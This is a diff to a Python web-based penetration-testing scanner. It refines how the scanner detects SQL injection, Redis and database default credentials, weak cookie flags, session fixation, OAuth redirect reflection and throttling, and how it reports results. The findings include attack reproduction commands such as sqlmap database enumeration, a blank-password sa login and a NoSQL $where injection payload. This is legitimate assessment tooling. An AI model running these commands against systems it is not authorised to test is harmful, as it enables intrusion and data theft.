                 "detail":f"Login timing differs valid={vt:.3f}s vs invalid={it:.3f}s ({slow/max(fast,0.001):.1f}x, single sample each) — username enumeration; repeat to confirm",
                 "command":"curl -sk -X POST 'http://<target>/login' -d 'user=admin&pass=wrong'"})
@@ -1866,7 +1905,8 @@ def parse_timing(output):
     baseline = re.search(r'sqli_baseline=([\d.]+)', output)
     if sqli and baseline:
         sp, bp = float(sqli.group(1)), float(baseline.group(1))
-        if sp > bp + 2.5:
+        # sp at the cap = the SLEEP probe timed out; that is not a measured delay
+        if sp > bp + 2.5 and sp < CAP_SLEEP - 0.5:
             findings.append({"type":"blind_sqli","severity":"critical","path":"/?id=",
                 "detail":f"SLEEP-based SQLi: probe={sp:.2f}s vs baseline={bp:.2f}s — blind SQL injection confirmed",
                 "command":"sqlmap -u 'http://<target>/?id=1' --level=5 --risk=3 --dbs"})
@@ -1898,14 +1938,29 @@ def parse_auth_probe(output):
             findings.append({"type":"ssh_outdated","severity":"high","path":"SSH :22",
                 "detail":f"Outdated SSH: {ssh_ver.group(0)}",
                 "command":"nc -w 4 <target> 22"})
+    # Flag attributes of the SESSION cookie only: a CSRF/preference cookie
+    # without HttpOnly is not a session weakness, and flagging it mislabelled a
+    # healthy app (same rule as the in-process cookie check).
+    cookie_line, cookie_name = '', ''
+    for line in output.splitlines():
+        m = re.search(r'set-cookie:\s*([^=;\s]+)=', line, re.I)
+        if not m:
+            continue
+        name = m.group(1)
+        if _COOKIE_CSRF_RE.search(name) or not _COOKIE_SESSION_RE.search(name):
+            continue
+        cookie_line, cookie_name = line, name
+        break
     missing_flags = []
-    if 'httponly' not in output.lower(): missing_flags.append('HttpOnly')
-    if 'secure' not in output.lower(): missing_flags.append('Secure')
-    if 'samesite' not in output.lower(): missing_flags.append('SameSite')
-    if missing_flags and 'set-cookie' in output.lower():
+    if cookie_line:
+        low = cookie_line.lower()
+        if 'httponly' not in low: missing_flags.append('HttpOnly')
+        if 'secure' not in low: missing_flags.append('Secure')
+        if 'samesite' not in low: missing_flags.append('SameSite')
+    if missing_flags:
         findings.append({"type":"cookie_flags","severity":"medium","path":"/login (Set-Cookie header)",
-            "detail":f"Session cookie missing: {', '.join(missing_flags)}",
-            "command":"curl -skI 'http://<target>/login'"})
+            "detail":f"Session cookie '{cookie_name}' missing: {', '.join(missing_flags)}",
+            "command":"curl -sk -D - -o /dev/null 'http://<target>/login'"})
     return findings
 
 # nmap NSE prints the script NAME on every line of its block — including its own
@@ -2450,7 +2505,11 @@ def parse_db_default_creds(output):
             "detail":"MSSQL sa account has empty/blank password",
             "path":"MSSQL :1433",
             "command":"sqlcmd -S <target> -U sa -P ''"})
-    if re.search(r'mysqladmin.*uptime|Version.*Uptime', output, re.I):
+    # The command itself is never part of the parsed output (the engine emits it
+    # as a separate '$ cmd' line), so the old 'mysqladmin.*uptime' pattern could
+    # never match. mysqladmin status prints exactly this shape:
+    # 'Uptime: 123  Threads: 1  Questions: 5 ...'
+    if re.search(r'Uptime:\s*\d+\s+Threads:\s*\d+', output, re.I):
         findings.append({"type":"db_default_cred","severity":"critical",
             "detail":"MySQL root accessible without password (mysqladmin status success)",
             "path":"MySQL :3306",
@@ -2465,7 +2524,8 @@ def parse_db_default_creds(output):
 def parse_db_sqli(output):
     findings = []
     sql_errors = [
-        r"SQL syntax.*near|syntax error.*at line|mysql_fetch_array|pg_query\(\)|ORA-\d{5}",
+        r"SQL syntax.*near|syntax error.*at line|mysql_fetch_array|pg_query\(\)|ORA-\d{5}|"
+        r"check the manual that corresponds to your MySQL",
         r"SQLSTATE\[\w+\]|PDOException|SQLiteException|Unclosed quotation mark",
         r"Warning.*mysql_|Fatal error.*mysql|Microsoft OLE DB.*error",
     ]
@@ -2479,7 +2539,7 @@ def parse_db_sqli(output):
     sleep_m = re.search(r'sleep_probe=([\d.]+)s baseline=([\d.]+)s', output)
     if sleep_m:
         sp, bp = float(sleep_m.group(1)), float(sleep_m.group(2))
-        if sp > bp + 2.5:
+        if sp > bp + 2.5 and sp < CAP_SLEEP - 0.5:
             findings.append({"type":"blind_sqli","severity":"critical",
                 "detail":f"Time-based blind SQLi confirmed: SLEEP probe={sp:.2f}s vs baseline={bp:.2f}s",
                 "path":"/?id= (time-based blind)",
@@ -2513,12 +2573,17 @@ def parse_db_nosql(output):
             "detail":"NoSQL $where JS injection accepted — server-side JS execution possible",
             "path":"/api/v1/users (POST body)",
             "command":"curl -X POST -H 'Content-Type: application/json' -d '{\"$where\":\"1==1\"}' http://<target>/api/v1/users"})
-    if re.search(r'requirepass.*\(empty\)|1\)\s*"requirepass"\s*\n\s*2\)\s*""', output, re.I):
+    # redis-cli prints raw values whenever stdout is a pipe (always, in the
+    # engine), so the pretty `1) "requirepass" / 2) ""` form never appears. The
+    # probe tags the value line instead; only an EMPTY value means no auth.
+    if re.search(r'(?m)^REQUIREPASS:\s*$', output):
         findings.append({"type":"redis_no_auth","severity":"critical",
             "detail":"Redis requirepass is empty — no authentication configured",
             "path":"Redis :6379 (CONFIG GET requirepass)",
             "command":"redis-cli -h <target> CONFIG GET requirepass"})
-    if re.search(r'KEYS.*\*.*:\d+|KEYS.*session|KEYS.*user|KEYS.*token', output, re.I):
+    # KEYS output is a bare list of key names — it never restates the command, so
+    # the probe tags each line (KEY:) and only session/token-shaped keys count.
+    if re.search(r'(?m)^KEY:\S*(?:session|sess|user|token|auth|jwt)', output, re.I):
         findings.append({"type":"redis_data_exposure","severity":"high",
             "detail":"Redis KEYS enumeration returned session/user/token data",
             "path":"Redis :6379 (KEYS *)",
@@ -2789,8 +2854,8 @@ def _js_bundle_url(src, target):
     if src.startswith('http://') or src.startswith('https://'):
         return src
     if src.startswith('/'):
-        return f'http://{target}{src}'
-    return f'http://{target}/{src}'
+        return f'{base_url}{src}'
+    return f'{base_url}/{src}'
 
 
 def parse_js_leak(output, sess):
@@ -3719,10 +3784,21 @@ def _normalize_findings(findings, sess, sub_id):
                               for k in ('detail', 'line', 'title', 'cve'))]
     real_target = sess.get('target', '')
     real_cmd = sess['commands'].get(sub_id, '')
+    try:
+        base = _base_url(sess) or ''
+    except Exception:
+        base = ''
+    base_host = re.sub(r'^https?://', '', base).rstrip('/') if base else real_target
     for f in findings:
         for key in ('command', 'detail', 'path'):
             val = f.get(key)
             if isinstance(val, str) and '<target>' in val:
+                # A URL placeholder must carry the discovered port; substituting
+                # only the host produced repro commands aimed at :80 for services
+                # listening on :8080/:8443.
+                if base:
+                    val = val.replace('https://<target>', f'https://{base_host}')
+                    val = val.replace('http://<target>', base)
                 f[key] = val.replace('<target>', real_target)
         cmd = str(f.get('command') or '').strip()
         if not cmd or cmd.lower() in ('manual review', 'msfconsole -q') \
@@ -3798,7 +3874,27 @@ def dispatch_parser(parse_type, output, sess):
 # ─────────────────────────────────────────────────────────────────────────────
 # EXECUTION ENGINE
 # ─────────────────────────────────────────────────────────────────────────────
+# Every substage gets a finite wall clock. Previously a substage with no entry
+# here and PWM_CMD_TIMEOUT=0 (the default) ran completely unbounded, so one
+# unresponsive endpoint stalled it forever and it never produced any result.
+DEFAULT_SUBSTAGE_TIMEOUT = 300
+
 LONG_SUBSTAGE_TIMEOUT = {
+    # Inherently slow scanners: without an explicit entry they would fall to
+    # DEFAULT_SUBSTAGE_TIMEOUT (300 s) and be killed mid-scan.
+    "vuln_ssl": 900,
+    "vuln_nikto": 900,
+    "vuln_cve": 900,
+    "recon_osint": 600,
+    "recon_smb": 600,
+    "db_discovery": 600,
+    "pe_network_map": 600,
+    "ep_vuln_verify": 600,
+    "recon_dns": 300,
+    "vuln_snmp": 300,
+    "vuln_smtp_ldap": 300,
+    "deep_service_proto": 300,
+    "pe_ad_enum": 300,
     "recon_ports": 1500,
     "vuln_nuclei": 1800,
     "vuln_web_dirs": 1200,
@@ -4009,20 +4105,16 @@ def _http(method, url, data=None, headers=None, timeout=7, cookie=None,
     try:
         with _PW_OPENER.open(req, timeout=timeout) as r:
             raw = r.read(max_bytes)
-            return {"ok": True, "status": r.status,
-                    "headers": {k.lower(): v for k, v in r.headers.items()},
-                    "body": raw.decode('utf-8', 'ignore'), "url": r.geturl(), "error": None}
+            return _mk_resp(r.status, r.headers, raw, r.geturl())
     except _urlerror.HTTPError as e:
         raw = b''
         try:
             raw = e.read(max_bytes)
         except Exception:
             pass
-        return {"ok": True, "status": e.code,
-                "headers": {k.lower(): v for k, v in (e.headers or {}).items()},
-                "body": raw.decode('utf-8', 'ignore'), "url": url, "error": None}
+        return _mk_resp(e.code, e.headers or {}, raw, url)
     except Exception as e:
-        return {"ok": False, "status": None, "headers": {}, "body": "",
+        return {"ok": False, "status": None, "headers": {}, "cookies": [], "body": "",
                 "url": url, "error": str(e)[:120]}
 
 
@@ -4056,9 +4148,71 @@ def _req_line(method, url, data=None, secret_keys=('password', 'pass', 'pwd')):
     return f"{method} {url}"
 
 
+_COOKIE_CSRF_RE = re.compile(r'csrf|xsrf|anticsrf', re.I)
+_COOKIE_SESSION_RE = re.compile(r'sess|sid|auth|token|jwt|login|remember|access', re.I)
+
+
+def _mk_resp(status, headers_msg, raw, url):
+    """Build a response record that keeps EVERY Set-Cookie header.
+
+    The previous dict comprehension flattened duplicate headers, so a response
+    setting ``session=...; HttpOnly; Secure; SameSite=Strict`` followed by
+    ``prefs=compact`` left only the preference cookie. The cookie-flag, entropy
+    and JWT checks then assessed the wrong cookie and reported weaknesses that
+    did not exist.
+    """
+    hdrs, cookies = {}, []
+    try:
+        items = list((headers_msg or {}).items())
+    except AttributeError:
+        items = []
+    for k, v in items:
+        lk = k.lower()
+        if lk == 'set-cookie':
+            cookies.append(v)
+            continue
+        hdrs[lk] = f"{hdrs[lk]}, {v}" if lk in hdrs else v
+    if cookies:
+        hdrs['set-cookie'] = ', '.join(cookies)
+    return {"ok": True, "status": status, "headers": hdrs, "cookies": cookies,
+            "body": raw.decode('utf-8', 'ignore'), "url": url, "error": None}
+
+
+def _cookie_headers(resp):
+    raw = list(resp.get('cookies') or [])
+    if not raw:
+        sc = (resp.get('headers') or {}).get('set-cookie')
+        if sc:
+            raw = [sc]
+    return raw
+
+
+def _pick_session_cookie(resp):
+    """(name, value, raw_header) of the cookie most likely to hold the session.
+
+    Prefers a session/auth-looking name and never treats a CSRF marker as the
+    session. Returns (None, None, '') when the response set no usable cookie.
+    """
+    items = []
+    for h in _cookie_headers(resp):
+        nv = (h or '').split(';')[0].strip()
+        if '=' in nv:
+            n, v = nv.split('=', 1)
+            items.append((n.strip(), v.strip(), h))
+    if not items:
+        return (None, None, '')
+    for n, v, h in items:
+        if not _COOKIE_CSRF_RE.search(n) and _COOKIE_SESSION_RE.search(n):
+            return (n, v, h)
+    for n, v, h in items:
+        if not _COOKIE_CSRF_RE.search(n):
+            return (n, v, h)
+    return (None, None, '')
+
+
 def _resp_cookie(resp):
-    sc = (resp.get('headers') or {}).get('set-cookie')
-    return sc.split(';')[0] if sc else None
+    name, val, _raw = _pick_session_cookie(resp)
+    return f'{name}={val}' if name else None
 
 
 def _norm_body(b):
@@ -4282,13 +4436,14 @@ def _reg_rate_limit(sid, sub_id, sub):
         # not throttling and must not be reported as "no rate limit" either.
         if r['status'] is not None:
             had_response = True
-        if r['status'] == 429 or (r['status'] is not None and r['status'] == 503):
+        if r['status'] in (429, 503) or _THROTTLE_RE.search(r['body'] or ''):
             throttled += 1
     lines.append((f"[signup] {attempts} rapid attempts, throttled={throttled}", "info"))
     if had_response and throttled == 0:
         findings.append({"type": "signup_rate_limit", "severity": "medium", "path": sup['path'],
                          "detail": f"No rate limiting observed across {attempts} rapid registration "
-                                   f"attempts (no 429/block) — mass account-creation abuse is unrestricted "
+                                   f"attempts (no 429/503 status and no throttling message) — mass "
+                                   f"account-creation abuse is unrestricted "
                                    f"(CWE-770).",
                          "command": _req_line('POST', sup['url'], body)})
     elif not had_response:
@@ -4309,6 +4464,10 @@ OAUTH_PATHS = ['/oauth/authorize', '/oauth2/authorize', '/authorize',
 LOGOUT_PATHS = ['/logout', '/signout', '/sign-out', '/api/logout', '/api/auth/logout']
 PROTECTED_PATHS = ['/api/me', '/account', '/profile', '/dashboard', '/api/v1/me', '/user/profile']
 _LOCKOUT_RE = re.compile(r'locked|too many|try again later|rate limit|please wait|account disabled', re.I)
+# Applications commonly throttle with HTTP 200 plus a message. Counting only
+# 429/503 reported "no rate limiting" against an app that was throttling.
+_THROTTLE_RE = re.compile(r'too many|try again (?:later|in)|rate.?limit|slow down|'
+                          r'please wait|temporarily blocked|exceeded (?:the )?limit', re.I)
 _ENUM_UNKNOWN_RE = re.compile(r'unknown|not found|no such|invalid (?:user|account|login)|'
                               r'does not exist|user does not', re.I)
 _ENUM_WRONGPW_RE = re.compile(r'incorrect password|wrong password|invalid password|'
@@ -4337,9 +4496,13 @@ ADMIN_PATHS = ['/admin', '/admin/', '/admin/users', '/admin/settings', '/adminis
 OBJECT_PATH_TMPL = ['/api/user/{id}', '/api/users/{id}', '/api/v1/users/{id}',
                     '/api/accounts/{id}', '/api/orders/{id}', '/api/profile/{id}']
 _ADMIN_MARKER_RE = re.compile(
-    r'"?(?:role|admin|superuser|isAdmin)"?\s*[:=]|'
-    r'\b(?:admin dashboard|user management|manage users|settings)\b|'
-    r'<title>[^<]*(?:admin|dashboard|管理)[^<]*</title>', re.I)
+    # Privileged content only. A bare "settings" (or any `"role":` key) made a
+    # public help page served at /admin count as administrative exposure.
+    r'\b(?:admin(?:istrator|istration)? (?:dashboard|console|panel)|'
+    r'user management|manage users|user administration|privileged console)\b|'
+    r'<title>[^<]*\b(?:admin|administrator|management console)\b[^<]*</title>|'
+    r'"is_?admin"\s*:\s*(?:true|1)|"role"\s*:\s*"(?:admin|administrator|superuser|root)"',
+    re.I)
 _CSRF_FIELD_RE = re.compile(r'csrf|xsrf|_token|authenticity|anticsrf|nonce', re.I)
 
 
@@ -4393,11 +4556,6 @@ def _other_identity(sess):
 def _login_cookie(sess, base, lg, ac):
     r = _http('POST', lg['url'], data=_build_login(lg, ac['username'], ac['password']))
     return _resp_cookie(r)
-
-
-def _login_raw(sess, base, lg, ac):
-    r = _http('POST', lg['url'], data=_build_login(lg, ac['username'], ac['password']))
-    return (r['headers'] or {}).get('set-cookie', '')
 
 
 def _authz_forced_browsing(sid, sub_id, sub):
@@ -4656,7 +4814,11 @@ def _auth_oauth(sid, sub_id, sub):
         if r['ok'] and r['status'] in (200, 302, 303):
             loc = (r['headers'].get('location') or '')
             lines.append((f"[oauth] GET {p} → HTTP {r['status']} location={loc[:80]}", "info"))
-            if 'pwm-evil.example' in loc:
+            # Only a Location whose HOST is the attacker host proves the
+            # redirect_uri was honoured. An endpoint that bounces to
+            # /login?next=<encoded evil url> merely echoes the parameter.
+            _m = re.match(r'^(?:https?:)?//([^/?#]+)', loc, re.I)
+            if _m and _m.group(1).lower() == 'pwm-evil.example':
                 findings.append({"type": "oauth_misconfig", "severity": "high", "path": p,
                                  "detail": "OAuth authorize endpoint reflects an arbitrary redirect_uri "
                                            "(pwm-evil.example) in the redirect Location without "
@@ -4702,9 +4864,22 @@ def _auth_logout(sid, sub_id, sub):
     stale = None
     for p in PROTECTED_PATHS:
         rr = _http('GET', base + p, cookie=cookie)
-        if rr['ok'] and rr['status'] == 200 and _norm_body(rr['body']):
-            stale = p
-            break
+        if not rr['ok'] or rr['status'] != 200:
+            continue
+        body = _norm_body(rr['body'])
+        if not body:
+            continue
+        # A rejected cookie usually receives the login page with HTTP 200, so
+        # "200 + non-empty body" is not evidence of a live session. Only content
+        # that differs from the anonymous baseline, and is not itself a login
+        # form, proves the session survived logout.
+        anon = _http('GET', base + p)
+        if anon['ok'] and anon['status'] == 200 and _norm_body(anon['body']) == body:
+            continue
+        if _PW_FIELD_RE.search(rr['body'] or ''):
+            continue
+        stale = p
+        break
     lines.append((f"[logout] after GET {lopath}, stale cookie on {stale or 'none'}", "info"))
     if stale:
         findings.append({"type": "logout_invalidation", "severity": "medium", "path": lopath,
@@ -4725,12 +4900,14 @@ def _session_cookie_flags(sid, sub_id, sub):
                          "command": ""})
         _finish_inproc(sid, sub_id, findings, lines); return
     r = _http('POST', lg['url'], data=_build_login(lg, ac['username'], ac['password']))
-    sc = (r['headers'] or {}).get('set-cookie', '')
+    name, _val, sc = _pick_session_cookie(r)
     if not sc:
         findings.append({"type": "not_tested", "severity": "info", "path": lg['path'],
                          "detail": "Login did not set a cookie (token/header session?) — cookie-flag "
                                    "check not applicable.", "command": ""})
         _finish_inproc(sid, sub_id, findings, lines); return
+    # Flags are read from THIS cookie's own header. On joined Set-Cookie text a
+    # flagged preference cookie could mask a session cookie with no flags.
     low = sc.lower(); missing = []
     if 'httponly' not in low:
         missing.append('HttpOnly')
@@ -4738,10 +4915,10 @@ def _session_cookie_flags(sid, sub_id, sub):
         missing.append('Secure')
     if 'samesite' not in low:
         missing.append('SameSite')
-    lines.append((f"[session] Set-Cookie: {sc[:120]}", "info"))
+    lines.append((f"[session] Set-Cookie ({name or '?'}): {sc[:120]}", "info"))
     if missing:
         findings.append({"type": "cookie_flags", "severity": "low", "path": lg['path'],
-                         "detail": f"Session cookie missing flag(s): {', '.join(missing)} "
+                         "detail": f"Session cookie '{name}' missing flag(s): {', '.join(missing)} "
                                    f"(observed Set-Cookie: {sc[:160]}) — susceptible to theft/CSRF (CWE-1004).",
                          "command": _req_line('POST', lg['url'], _build_login(lg, ac['username'], '***'))})
     else:
@@ -4770,24 +4947,19 @@ def _session_entropy(sid, sub_id, sub):
         _finish_inproc(sid, sub_id, findings, lines); return
     v = max(vals, key=len)
     uniq = set(vals)
-    # Charset is estimated over every observed value, not one sample; estimated
-    # bits = length x log2(charset). The old length/charset-only test passed a
-    # 12-character token with 8 distinct characters (~36 bits) as "random".
-    charset = len(set(''.join(vals)))
-    est_bits = len(v) * _math.log2(max(charset, 2))
-    lines.append((f"[session] {len(vals)} cookie(s); sample len={len(v)} charset={charset} "
-                  f"est_bits={est_bits:.0f}", "info"))
+    # Only properties that were actually observed are reported. An "estimated
+    # bits" figure (length x log2(alphabet)) was a guess about a generator we
+    # never see, and it read as a measurement in the report; the checks below
+    # are facts taken from the collected values themselves.
+    alphabet = len(set(''.join(vals)))
+    digits_only = bool(v) and v.isdigit()
+    lines.append((f"[session] {len(vals)} cookie(s); sample length={len(v)}; observed "
+                  f"alphabet={alphabet} symbols; distinct values={len(uniq)}/{len(vals)}", "info"))
     if len(vals) > 1 and len(uniq) == 1:
         findings.append({"type": "session_entropy", "severity": "critical", "path": lg['path'],
                          "detail": f"Session identifier is identical across {len(vals)} separate "
                                    f"logins — the value is static/predictable and can be replayed "
                                    f"or guessed (CWE-330).",
-                         "command": _req_line('POST', lg['url'], _build_login(lg, ac['username'], '***'))})
-    elif len(v) < 16 or est_bits < 64:
-        findings.append({"type": "session_entropy", "severity": "medium", "path": lg['path'],
-                         "detail": f"Session identifier appears low-entropy (length {len(v)}, "
-                                   f"{charset} distinct characters, ~{est_bits:.0f} bits estimated) — "
-                                   f"predictable session ids enable hijacking (CWE-330).",
                          "command": _req_line('POST', lg['url'], _build_login(lg, ac['username'], '***'))})
     elif len(vals) > 1 and len(uniq) < len(vals):
         findings.append({"type": "session_entropy", "severity": "medium", "path": lg['path'],
@@ -4795,9 +4967,22 @@ def _session_entropy(sid, sub_id, sub):
                                    f"({len(uniq)} unique values from {len(vals)} logins) — session IDs "
                                    f"may not be generated randomly (CWE-330).",
                          "command": _req_line('POST', lg['url'], _build_login(lg, ac['username'], '***'))})
+    elif len(v) < 16:
+        findings.append({"type": "session_entropy", "severity": "medium", "path": lg['path'],
+                         "detail": f"Session identifier is only {len(v)} characters long "
+                                   f"(measured on the cookie issued at login) — identifiers shorter "
+                                   f"than 16 characters have a search space small enough to "
+                                   f"enumerate (CWE-330).",
+                         "command": _req_line('POST', lg['url'], _build_login(lg, ac['username'], '***'))})
+    elif digits_only:
+        findings.append({"type": "session_entropy", "severity": "medium", "path": lg['path'],
+                         "detail": f"Session identifier is numeric-only ({len(v)} digits) — the "
+                                   f"generator is restricted to a 10-symbol alphabet, so "
+                                   f"identifiers are predictable at scale (CWE-330).",
+                         "command": _req_line('POST', lg['url'], _build_login(lg, ac['username'], '***'))})
     else:
-        lines.append(("[session] session id length/charset/estimated entropy consistent "
-                      "with a random token", "info"))
+        lines.append((f"[session] no weakness observed in session id length ({len(v)}), "
+                      f"alphabet ({alphabet} symbols observed) or reuse across logins", "info"))
     _finish_inproc(sid, sub_id, findings, lines)
 
 
@@ -4810,17 +4995,28 @@ def _session_fixation(sid, sub_id, sub):
                          "command": ""})
         _finish_inproc(sid, sub_id, findings, lines); return
     pre = _http('GET', lg['url'])
-    prec = _resp_cookie(pre)
+    pre_name, pre_val, _ = _pick_session_cookie(pre)
+    prec = f'{pre_name}={pre_val}' if pre_name else None
     r = _http('POST', lg['url'], data=_build_login(lg, ac['username'], ac['password']), cookie=prec)
-    postc = _resp_cookie(r)
-    lines.append((f"[session] pre-auth cookie={prec}; post-auth cookie={postc}", "info"))
-    if prec and postc and prec == postc:
+    post_name, post_val, _ = _pick_session_cookie(r)
+    lines.append((f"[session] pre-auth cookie={pre_name or 'none'}; "
+                  f"post-auth cookie={post_name or 'none'}", "info"))
+    if not pre_name or not post_name:
+        findings.append({"type": "not_tested", "severity": "info", "path": lg['path'],
+                         "detail": "No pre-auth session cookie was issued before login — session "
+                                   "fixation cannot be tested (nothing inferred).", "command": ""})
+        _finish_inproc(sid, sub_id, findings, lines); return
+    if pre_name != post_name:
+        lines.append((f"[session] pre-auth '{pre_name}' and post-auth '{post_name}' are different "
+                      f"cookies — rotation not assessable", "meta"))
+    elif pre_val == post_val:
         findings.append({"type": "session_fixation", "severity": "high", "path": lg['path'],
-                         "detail": "Session identifier is not rotated on authentication (pre-auth cookie "
-                                   "equals post-auth cookie) — session fixation is possible (CWE-384).",
+                         "detail": f"Session cookie '{post_name}' is not rotated on authentication "
+                                   f"(identical value before and after login) — session fixation is "
+                                   f"possible (CWE-384).",
                          "command": _req_line('POST', lg['url'], _build_login(lg, ac['username'], '***'))})
     else:
-        lines.append(("[session] session id rotated (or no pre-auth cookie issued)", "info"))
+        lines.append((f"[session] session cookie '{post_name}' rotated on authentication", "info"))
     _finish_inproc(sid, sub_id, findings, lines)
 
 
@@ -4875,10 +5071,13 @@ def _bizlogic_csrf(sid, sub_id, sub):
     raw = ''
     lg = ctx.get('login'); ac = _operator_creds(sess)
     if lg and ac:
-        raw = _login_raw(sess, base, lg, ac)
+        _r = _http('POST', lg['url'], data=_build_login(lg, ac['username'], ac['password']))
+        _n, _v, raw = _pick_session_cookie(_r)
     if not raw and lg:
-        raw = (_http('GET', lg['url'])['headers'] or {}).get('set-cookie', '')
-    cookie = raw.split(';')[0] if raw else None
+        _n, _v, raw = _pick_session_cookie(_http('GET', lg['url']))
+    # Only the session cookie's own attributes count: on the joined Set-Cookie
+    # text a SameSite on any other cookie masked a session cookie without it.
+    cookie = f'{_n}={_v}' if raw else None
     same_site = bool(re.search(r';\s*samesite', raw, re.I))
     for name, f in forms:
         fields = f.get('fields') or []
@@ -5027,7 +5226,8 @@ def _execute_substage(sid, sub_id):
     # unbounded. The per-substage value now always applies; the global value is
     # used as a fallback and as an upper bound when set.
     timeout = None
-    sub_timeout = sub.get('timeout') or LONG_SUBSTAGE_TIMEOUT.get(sub_id)
+    sub_timeout = (sub.get('timeout') or LONG_SUBSTAGE_TIMEOUT.get(sub_id)
+                   or DEFAULT_SUBSTAGE_TIMEOUT)
     try:
         if sub_timeout:
             timeout = float(sub_timeout)
@@ -5115,6 +5315,10 @@ def _complete_substage(sid, sub_id, findings=None, rc=0):
         if sub_id in sess['skipped'] or sub_id in sess['completed']:
             return False
         sess['completed'].append(sub_id)
+        # A negative rc means the substage never produced a usable result
+        # (tool missing, fallback absent, crash). Without this the report
+        # labelled it COMPLETED with zero findings — i.e. "tested, nothing found".
+        sess.setdefault('rc', {})[sub_id] = rc
     push(sid, "completed", {"substage": sub_id, "findings": findings,
                             "finding_count": len(findings), "rc": rc})
     _advance_chain(sid, sub_id)
@@ -5239,7 +5443,7 @@ def new_session():
         "target_type": detect_target_type(raw),
         "created": datetime.now().isoformat(),
         "outdir": outdir,
-        "findings": {}, "outputs": {}, "commands": {},
+        "findings": {}, "outputs": {}, "commands": {}, "rc": {},
         "completed": [], "approved": [], "skipped": [], "launched": set(),
         "stage_approved": set(),
         "lock": threading.Lock(),
@@ -5250,7 +5454,8 @@ def new_session():
         "web_origin": _origin_from_raw(raw),
     }
     output_queues[sid] = queue.Queue(maxsize=20000)
-    return jsonify({"sid": sid, "target": target, "target_type": sessions[sid]['target_type']})
+    return jsonify({"sid": sid, "target": target, "target_type": sessions[sid]['target_type'],
+                    "base_url": _base_url(sessions[sid])})
 
 @app.route('/api/session/<sid>', methods=['DELETE'])
 def delete_session(sid):
@@ -5408,8 +5613,13 @@ def status(sid):
         # RUNNING instead of falling back to AWAITING APPROVAL.
         "launched": sorted(sess.get('launched') or []),
         "finding_counts": {k:len(v) for k,v in sess['findings'].items()},
+        # per-substage exit status: rc != 0 means "no usable result", not "clean"
+        "rc": sess.get('rc', {}),
         "findings": sess['findings'],
         "ports_found": sess.get('ports_found',''),
+        # resolved web origin, so command previews show the real port once recon
+        # has discovered it instead of guessing :80
+        "base_url": _base_url(sess),
         "triage_log": sess.get('triage_log', {}),
         "assessment": sess.get('assessment'),
         "roles": [a.get('role') for a in sess.get('accounts', [])],
@@ -5638,8 +5848,14 @@ def build_pdf(sess: dict) -> str:
 
     story = []
     all_f = [f for flist in sess['findings'].values() for f in flist]
-    sc = {s: sum(1 for f in all_f if f.get('severity')==s)
+    # "not_tested" rows are coverage notes, not findings: counting them inflated
+    # the report's finding totals and its informational row.
+    countable = [f for f in all_f if f.get('type') != 'not_tested']
+    sc = {s: sum(1 for f in countable if f.get('severity')==s)
           for s in ['critical','high','medium','low','info']}
+    done_subs = set(sess.get('completed') or []) | set(sess.get('skipped') or [])
+    stages_run = sum(1 for st in CHAIN
+                     if any(s['id'] in done_subs for s in st['substages']))
 
     # ── COVER ─────────────────────────────────────────────────────────────
     story += [
@@ -5654,8 +5870,11 @@ def build_pdf(sess: dict) -> str:
         ["Target Type",   sess['target_type'].upper()],
         ["Scan Date",     sess['created'][:10]],
         ["Session ID",    sess['sid'][:8]],
-        ["Stages Run",    str(len(sess['completed']))],
-        ["Total Findings",str(len(all_f))],
+        # len(completed) counts SUBSTAGES, so the cover used to claim e.g.
+        # "Stages Run: 37" for a 12-stage chain.
+        ["Stages Run",    f"{stages_run}/{len(CHAIN)}"],
+        ["Total Findings",str(len(countable))],
+        ["Not Tested",    str(len(all_f) - len(countable))],
         ["Critical",      str(sc.get('critical',0))],
         ["High",          str(sc.get('high',0))],
         ["Medium",        str(sc.get('medium',0))],
@@ -5755,6 +5974,13 @@ def build_pdf(sess: dict) -> str:
                 continue
             stat = ("COMPLETED" if sub['id'] in sess['completed'] else
                     "SKIPPED" if sub['id'] in sess['skipped'] else "NOT RUN")
+            rc = (sess.get('rc') or {}).get(sub['id'])
+            if stat == "COMPLETED" and rc not in (None, 0):
+                # rc<0 = never produced a result (tool missing / no privilege /
+                # crash); 124 = killed by the wall-clock cap. Any other non-zero
+                # exit is reported verbatim rather than assumed to be a failure.
+                stat = (f"NO RESULT (rc={rc})" if rc < 0 or rc == 124
+                        else f"COMPLETED (rc={rc})")
             story.append(Paragraph(
                 f"{sub['label']} <font color='#586069' size='7.5'>[{stat}]</font>", H3))
             story.append(Paragraph(sub['description'], META))
